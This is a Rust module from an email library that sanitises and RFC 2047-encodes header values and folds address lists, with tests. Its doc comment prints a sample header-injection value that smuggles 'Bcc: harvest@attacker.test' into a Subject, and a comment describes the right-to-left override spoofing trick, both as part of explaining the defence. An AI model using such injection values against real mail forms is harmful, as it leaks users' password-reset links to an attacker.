//! What may go in a header, and what it looks like once it is there.
//!
//! # The whole security case of this crate is in this file
//!
//! A header ends at a CR LF. A mail header block ends at a blank line. So one
//! newline inside a subject, a display name or an address turns one header
//! into two, and the second one is whatever the attacker wrote:
//!
//! ```text
//! Subject: Reset your password\r\nBcc: harvest@attacker.test
//! ```
//!
//! That is a blind carbon copy of every password-reset link this application
//! sends, bought with a form field. It is the oldest injection in mail and it
//! still works, because the dangerous byte is also the delimiter.
//!
//! Two answers exist. **Fold** -- re-wrap the value so the CR LF is followed
//! by whitespace and stays inside the same header. **Refuse** -- answer an
//! error. This crate refuses, for every field a caller supplies, and folds
//! only where folding is this crate's own doing: a long address list and a
//! long encoded subject, both of which it wrote itself and therefore knows the
//! shape of. Refusing is the one of the two that cannot be got subtly wrong,
//! and the caller is a template that has no business putting a newline in a
//! subject anyway.
//!
//! # Non-ASCII is encoded, never passed through
//!
//! A header is an ASCII medium. A `Subject` or a display name with an accent
//! in it becomes an RFC 2047 encoded-word, `=?utf-8?B?...?=`, so the bytes on
//! the wire stay inside 0x20..0x7e whatever the person typed. That also closes
//! the smuggling variant of the same attack: a relay, a filter and the
//! recipient's client can disagree about what a raw 8-bit header means, and
//! they cannot disagree about base64.

use base64::engine::general_purpose::STANDARD;
use base64::Engine;

/// The longest line this crate writes before it folds, in octets.
///
/// RFC 5322 puts the hard limit at 998 and the recommendation at 78. We fold
/// at the recommendation, because the hard limit is where a relay starts
/// rewriting our message for us.
pub(crate) const FOLD_AT: usize = 78;

/// `=?utf-8?B?` + `?=`.
const ENCODED_WORD_OVERHEAD: usize = 12;

/// The longest encoded-word RFC 2047 allows, in octets.
const MAX_ENCODED_WORD: usize = 75;

/// How many source bytes fit in one encoded-word.
///
/// 75 - 12 = 63 octets of base64, rounded down to a multiple of 4 is 60, and
/// 60 base64 characters carry 45 bytes.
const BYTES_PER_WORD: usize = 45;

/// Refuses text that must never reach a header.
///
/// Control characters go, all of them. CR and LF are the attack; NUL and the
/// rest are refused with them because a header is not a place for a control
/// character and a list of exceptions is a list of things to get wrong. TAB is
/// legal folding whitespace in a header, and it is refused here too: this
/// crate does its own folding, so a caller's tab is only ever a way to make
/// the folded result ambiguous.
pub(crate) fn check_header_text(text: &str) -> Result<(), &'static str> {
    for c in text.chars() {
        if c == '\r' || c == '\n' {
            return Err("it contains a line break, which would end the header");
        }
        if c.is_control() {
            return Err("it contains a control character");
        }
        // A right-to-left override reverses what a mail client shows without
        // changing a byte of what it does. `moc.rekcatta@` renders as
        // `attacker.com`. The trick is old and still works.
        if matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{200e}' | '\u{200f}')
        {
            return Err("it contains a bidirectional override");
        }
        // U+2028 and U+2029 are not line breaks to a mail relay, but they are
        // to a JavaScript parser and to some clients that render a header.
        if matches!(c, '\u{2028}' | '\u{2029}') {
            return Err("it contains a line separator");
        }
    }
    Ok(())
}

/// Whether the text can go on the wire as it stands.
fn is_plain_ascii(text: &str) -> bool {
    text.bytes().all(|b| (0x20..=0x7e).contains(&b))
}

/// Encodes one piece of text as RFC 2047 encoded-words, folded.
///
/// Splits on character boundaries, never in the middle of a UTF-8 sequence, so
/// no word decodes to a replacement character.
fn encoded_words(text: &str) -> String {
    let mut words: Vec<String> = Vec::new();
    let mut chunk = String::new();
    for c in text.chars() {
        if chunk.len() + c.len_utf8() > BYTES_PER_WORD {
            words.push(one_word(&chunk));
            chunk.clear();
        }
        chunk.push(c);
    }
    if !chunk.is_empty() || words.is_empty() {
        words.push(one_word(&chunk));
    }
    // Folding whitespace between encoded-words is removed by the decoder, so
    // the recipient sees one string however many words it took.
    words.join("\r\n ")
}

fn one_word(chunk: &str) -> String {
    debug_assert!(ENCODED_WORD_OVERHEAD + STANDARD.encode(chunk).len() <= MAX_ENCODED_WORD);
    format!("=?utf-8?B?{}?=", STANDARD.encode(chunk))
}

/// Renders an unstructured header value -- a subject.
///
/// Call [`check_header_text`] first. This function assumes it passed.
pub(crate) fn unstructured(name: &str, text: &str) -> String {
    if is_plain_ascii(text) && name.len() + 2 + text.len() <= FOLD_AT {
        return text.to_string();
    }
    if is_plain_ascii(text) {
        // Long but plain. Folding an arbitrary ASCII subject means guessing
        // where a space is safe, and a subject that folds in the wrong place
        // reads wrong in every client. Encode it instead: an encoded-word
        // folds at a boundary this crate chose.
        return encoded_words(text);
    }
    encoded_words(text)
}

/// Renders a display name for the phrase position of an address.
///
/// Call [`check_header_text`] first. This function assumes it passed.
pub(crate) fn phrase(text: &str) -> String {
    if is_plain_ascii(text) {
        // A quoted-string, always, rather than a bare atom when the characters
        // happen to allow one. `"` and `\` are escaped, and every other
        // special -- the comma that would split the address list, the angle
        // brackets that would close the addr-spec, the parenthesis that would
        // open a comment -- is inert inside the quotes.
        let mut out = String::with_capacity(text.len() + 2);
        out.push('"');
        for c in text.chars() {
            if c == '"' || c == '\\' {
                out.push('\\');
            }
            out.push(c);
        }
        out.push('"');
        return out;
    }
    // An encoded-word is not allowed inside a quoted-string, so a non-ASCII
    // name goes bare. It carries no special character by construction: base64
    // is `A-Za-z0-9+/=`.
    encoded_words(text)
}

/// Writes one header, folding an address list between its addresses.
///
/// The only place this crate folds. The parts are addresses it rendered
/// itself, so the fold always lands after a comma and never inside a
/// quoted-string.
pub(crate) fn address_list(name: &str, parts: &[String]) -> String {
    let mut out = String::with_capacity(name.len() + 2 + parts.len() * 32);
    out.push_str(name);
    out.push_str(": ");
    let mut column = name.len() + 2;
    for (index, part) in parts.iter().enumerate() {
        if index > 0 {
            out.push(',');
            column += 1;
            if column + 1 + part.len() > FOLD_AT {
                out.push_str("\r\n ");
                column = 1;
            } else {
                out.push(' ');
                column += 1;
            }
        }
        out.push_str(part);
        column += part.len();
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_encoded_word_never_exceeds_seventy_five_octets() {
        for length in 1..300 {
            let text = "é".repeat(length);
            for word in encoded_words(&text).split("\r\n ") {
                assert!(word.len() <= MAX_ENCODED_WORD, "{} octets", word.len());
            }
        }
    }

    #[test]
    fn an_encoded_word_round_trips() {
        let text = "Ré-initialisation de votre mot de passe — 日本語も";
        let joined: String = encoded_words(text)
            .split("\r\n ")
            .map(|word| {
                let inner = word
                    .strip_prefix("=?utf-8?B?")
                    .and_then(|w| w.strip_suffix("?="))
                    .expect("an encoded-word");
                String::from_utf8(STANDARD.decode(inner).expect("base64")).expect("utf-8")
            })
            .collect();
        assert_eq!(joined, text);
    }
}
